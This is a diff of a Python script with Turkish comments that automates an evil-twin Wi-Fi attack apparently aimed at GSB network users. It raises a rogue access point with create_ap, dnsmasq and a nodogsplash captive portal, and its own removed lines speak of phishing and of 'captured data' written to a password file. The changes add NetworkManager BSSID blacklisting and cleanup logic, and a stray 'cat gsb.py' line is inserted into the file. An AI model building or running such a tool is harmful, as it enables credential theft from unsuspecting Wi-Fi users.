@@ -1,3 +1,4 @@
+cat gsb.py
 import subprocess
 import os
 import time
@@ -26,7 +27,7 @@ active_clients = set()
 INTERFACE = ""
 
 # --- BAĞIMLILIKLAR ---
-REQUIRED_PACKAGES = ["create_ap", "nodogsplash", "dnsmasq", "python3", "fuser", "iw"]
+REQUIRED_PACKAGES = ["create_ap", "nodogsplash", "dnsmasq", "python3", "fuser", "iw", "nmcli"]
 
 # --- ARGÜMAN YÖNETİMİ ---
 parser = argparse.ArgumentParser(description='GSB-WIFI Otomasyon Paneli')
@@ -47,6 +48,38 @@ def safe_print(msg, log_it=True):
     if log_it:
         write_to_log(msg)
 
+def get_mac_address(iface):
+    try:
+        with open(f"/sys/class/net/{iface}/address", "r") as f:
+            return f.read().strip().lower()
+    except:
+        return None
+
+def manage_bssid_blacklist(action):
+    """Sistemdeki Wi-Fi profillerine BSSID kara listesi ekler veya çıkarır."""
+    mac = get_mac_address(INTERFACE)
+    if not mac:
+        return
+
+    try:
+        # Tüm Wi-Fi türündeki bağlantı UUID'lerini al
+        cmd = "nmcli -t -f UUID,TYPE connection show | grep 802-11-wireless | cut -d: -f1"
+        uuids = subprocess.check_output(cmd, shell=True, text=True).splitlines()
+        
+        for uuid in uuids:
+            if action == "add":
+                # MAC adresini blacklist'e ekle
+                subprocess.run(["sudo", "nmcli", "connection", "modify", uuid, "+802-11-wireless.bssid-blacklist", mac], stderr=subprocess.DEVNULL)
+            elif action == "remove":
+                # MAC adresini blacklist'ten çıkar
+                subprocess.run(["sudo", "nmcli", "connection", "modify", uuid, "-802-11-wireless.bssid-blacklist", mac], stderr=subprocess.DEVNULL)
+        
+        subprocess.run(["sudo", "nmcli", "connection", "reload"], stderr=subprocess.DEVNULL)
+        if action == "add":
+            safe_print(f"[*] İzolasyon Aktif: {CYAN}{mac}{NC} kara listeye alındı.")
+    except Exception as e:
+        safe_print(f"{RED}[!] İzolasyon Hatası: {e}{NC}")
+
 def check_dependencies():
     missing = []
     for pkg in REQUIRED_PACKAGES:
@@ -56,15 +89,8 @@ def check_dependencies():
     
     if missing:
         print(f"{RED}[!] HATA: Sistemde gerekli araçlar bulunamadı: {', '.join(missing)}{NC}")
-        print(f"{YELLOW}[*] Çözüm Yolları:{NC}")
-        print(f"  1. Paket yöneticisi ile kurmayı deneyin:")
-        print(f"     sudo apt update && sudo apt install create_ap nodogsplash dnsmasq")
-        print(f"  2. Eğer araçları manuel kurduysanız, /usr/bin veya /usr/sbin altında")
-        print(f"     olduklarından ve isimlerinin doğru olduğundan emin olun.")
-        print(f"  3. GitHub üzerinden manuel kurulum için her aracın kendi dökümantasyonuna bakın.")
         sys.exit(1)
 
-# --- OTOMATIK PORTAL VE CONFIG KURULUMU ---
 def setup_portal_files():
     if not os.path.exists(LOCAL_PORTAL):
         print(f"{RED}[!] HATA: '{LOCAL_PORTAL}' klasörü bulunamadı!{NC}")
@@ -129,7 +155,6 @@ def setup_html_gateway_fix():
         if os.path.exists(splash_file):
             sed_pattern = "s/192\.168\.[0-9]+\.[0-9]+/" + gateway + "/g"
             subprocess.run(["sudo", "sed", "-i", "-E", sed_pattern, splash_file], check=True)
-            
             safe_print(f"[*] Portal Gateway Fix: {CYAN}{gateway}{NC}")
     except Exception as e:
         safe_print(f"{RED}[!] Gateway Fix Hatası: {e}{NC}")
@@ -138,33 +163,27 @@ def clean_exit(sig, frame):
     sys.stdout.write(f"\r\033[K{YELLOW}[!] Çıkılıyor...{NC}\n")
     sys.stdout.flush()
     write_to_log("OPERASYON DURDURULDU.")
-    DEVNULL = subprocess.DEVNULL
     
+    # BSSID Blacklist temizliği
+    manage_bssid_blacklist("remove")
+
+    DEVNULL = subprocess.DEVNULL
     subprocess.run(["sudo", "pkill", "-9", "-f", "nodogsplash"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "-f", "create_ap"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "-f", "logger.py"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "dnsmasq"], stdout=DEVNULL, stderr=DEVNULL)
     
-    if os.path.exists(NM_CONF):
-        subprocess.run(["sudo", "sed", "-i", "/unmanaged-devices/d", NM_CONF], stdout=DEVNULL, stderr=DEVNULL)
-        if os.path.exists(NM_CONF + ".bak"):
-            subprocess.run(["sudo", "mv", NM_CONF + ".bak", NM_CONF], stdout=DEVNULL, stderr=DEVNULL)
-        if INTERFACE:
-            subprocess.run(["sudo", "nmcli", "dev", "set", INTERFACE, "managed", "yes"], stdout=DEVNULL, stderr=DEVNULL)
-        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=DEVNULL, stderr=DEVNULL)
-
-    subprocess.run(["sudo", "rm", "-rf", NDS_HTDOCS], stdout=DEVNULL, stderr=DEVNULL)
-    if os.path.exists(NDS_CONFIG + ".bak"):
-        subprocess.run(["sudo", "mv", NDS_CONFIG + ".bak", NDS_CONFIG], stdout=DEVNULL, stderr=DEVNULL)
+    if os.path.exists(NM_CONF + ".bak"):
+        subprocess.run(["sudo", "mv", NM_CONF + ".bak", NM_CONF], stdout=DEVNULL, stderr=DEVNULL)
     
+    if INTERFACE:
+        subprocess.run(["sudo", "nmcli", "dev", "set", INTERFACE, "managed", "yes"], stdout=DEVNULL, stderr=DEVNULL)
+    
+    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "systemctl", "start", "systemd-resolved"], stdout=DEVNULL, stderr=DEVNULL)
+    
     os.system('stty sane')
-    safe_print(f"{CYAN}----------------------------------------------{NC}")
-    print(f"\n{CYAN}[i] Operasyon Özeti:{NC}")
-    print(f"    - Tüm loglar: {os.path.abspath(LOG_FILE)}")
-    print(f"    - Ele geçirilen veriler: {PASS_FILE}")
-    print(f"{GREEN}[+] Bitti.{NC}")
-    sys.stdout.flush()
+    safe_print(f"{GREEN}[+] Bitti.{NC}")
     os._exit(0)
 
 signal.signal(signal.SIGINT, clean_exit)
@@ -211,40 +230,25 @@ def run():
         if not ifaces: 
             print(f"{RED}[!] Wi-Fi kartı bulunamadı!{NC}")
             return
-        # --- TEK KART UYARISI ---
-        if len(ifaces) == 1:
-            print(f"{RED}[!] Uyarı: Bu script düzgün çalışabilmek için harici bir karta ihtiyaç duymaktadır, sisteminizde sadece 1 adet yayın yapabilir kart algılandı. Devam edebilirsiniz ancak bu, client cihazların \"internet yok\" hatasıyla karşılaşmasına ve phishingin çalışmamasına sebebiyet verebilir.{NC}")
-
         for i, iface in enumerate(ifaces): print(f"  {i+1}) {iface}")
         idx1 = int(input("Yayın Kartı Seçin: ")) - 1
         INTERFACE = ifaces[idx1]
 
+    # --- IZOLASYON VE NM YONETIMI ---
+    manage_bssid_blacklist("add")
+    subprocess.run(["sudo", "nmcli", "dev", "set", INTERFACE, "managed", "no"])
+
     setup_nds_config(INTERFACE)
 
-    # --- OTOMATİK İNTERNET KAYNAĞI SEÇİMİ ---
+    # --- INTERNET KAYNAGI SECIMI ---
     INTERNET_INT = "lo"
     blacklist = ["wg", "veth", "docker", "br-", "tun"]
-    
-    valid_ifaces = []
-    for iface in all_sys_ifaces:
-        if iface != INTERFACE and iface != "lo":
-            if not any(iface.startswith(prefix) for prefix in blacklist):
-                valid_ifaces.append(iface)
+    valid_ifaces = [iface for iface in all_sys_ifaces if iface != INTERFACE and iface != "lo" and not any(iface.startswith(p) for p in blacklist)]
 
     if valid_ifaces:
-        for v_iface in valid_ifaces:
-            if v_iface.startswith("wl"):
-                INTERNET_INT = v_iface
-                break
-        
-        if INTERNET_INT == "lo":
-            for v_iface in valid_ifaces:
-                if any(v_iface.startswith(p) for p in ["en", "eth"]):
-                    INTERNET_INT = v_iface
-                    break
-        
-        if INTERNET_INT == "lo":
-            INTERNET_INT = valid_ifaces[0]
+        INTERNET_INT = next((i for i in valid_ifaces if i.startswith("wl")), 
+                            next((i for i in valid_ifaces if any(i.startswith(p) for p in ["en", "eth"])), 
+                            valid_ifaces[0]))
 
     safe_print(f"[*] SSID  : {GREEN}{args.ssid}{NC}")
     safe_print(f"[*] Yayın : {GREEN}{INTERFACE}{NC}")
